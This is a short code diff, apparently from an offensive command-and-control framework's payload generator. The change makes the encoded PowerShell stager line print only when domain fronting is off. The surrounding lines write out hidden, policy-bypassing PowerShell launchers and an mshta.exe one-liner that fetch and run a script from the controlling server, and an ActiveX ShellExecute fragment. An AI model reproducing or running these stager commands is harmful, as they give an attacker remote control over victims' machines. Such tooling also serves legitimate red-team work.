@@ -321,7 +321,12 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
         psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
         uri = self.HostnameIP + ":" + self.Serverport + "/" + QuickCommand + "_cs"
 
-        self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))
+        # only run if the domainfrontheader is null
+        if self.DomainFrontHeader:
+            self.QuickstartLog("powershell small one liner does not work with domain fronting")
+        else:
+            self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))
+
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Other Execution Methods" + Colours.GREEN)
         self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % uri)
